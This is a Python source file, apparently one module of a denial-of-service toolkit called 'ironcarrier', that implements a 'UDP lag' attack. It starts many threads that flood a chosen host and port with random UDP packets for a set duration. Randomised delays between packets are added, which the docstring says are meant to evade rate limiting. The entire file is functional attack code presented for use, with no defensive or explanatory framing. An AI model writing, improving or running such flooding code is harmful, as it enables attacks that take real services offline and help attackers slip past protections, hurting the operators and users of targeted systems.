#!/usr/bin/env python3
"""
UDP Lag Vector
UDP flood with artificial delays to evade rate limiting
"""

import socket
import random
import time
import threading
from typing import Optional
from ironcarrier.core.stats import StatsCollector


class Attack:
    """UDP lag attack vector"""
    
    def __init__(self, target: str, port: int, duration: int,
                 threads: int = 100, stop_event: Optional[threading.Event] = None,
                 stats: Optional[StatsCollector] = None, **kwargs):
        self.target = target
        self.port = port
        self.duration = duration
        self.threads = threads
        self.stop_event = stop_event or threading.Event()
        self.stats = stats or StatsCollector()
        self.packet_size = min(kwargs.get('size', 512), 65507)
        self.min_delay = kwargs.get('min_delay', 0.01)
        self.max_delay = kwargs.get('max_delay', 0.1)
        self._resolved_target = None
    
    def _resolve_target(self) -> str:
        if self._resolved_target:
            return self._resolved_target
        self._resolved_target = socket.gethostbyname(self.target)
        return self._resolved_target
    
    def _attack_thread(self) -> None:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 65535)
        end_time = time.time() + self.duration
        dst = (self._resolve_target(), self.port)
        
        while time.time() < end_time and not self.stop_event.is_set():
            try:
                payload = bytes(random.getrandbits(8) for _ in range(self.packet_size))
                sock.sendto(payload, dst)
                self.stats.add_packets(1, len(payload))
                time.sleep(random.uniform(self.min_delay, self.max_delay))
            except Exception:
                self.stats.add_error()
        sock.close()
    
    def run(self) -> None:
        self._resolve_target()
        threads = [threading.Thread(target=self._attack_thread, daemon=True) for _ in range(self.threads)]
        for t in threads: t.start()
        for t in threads: t.join(timeout=self.duration + 10)
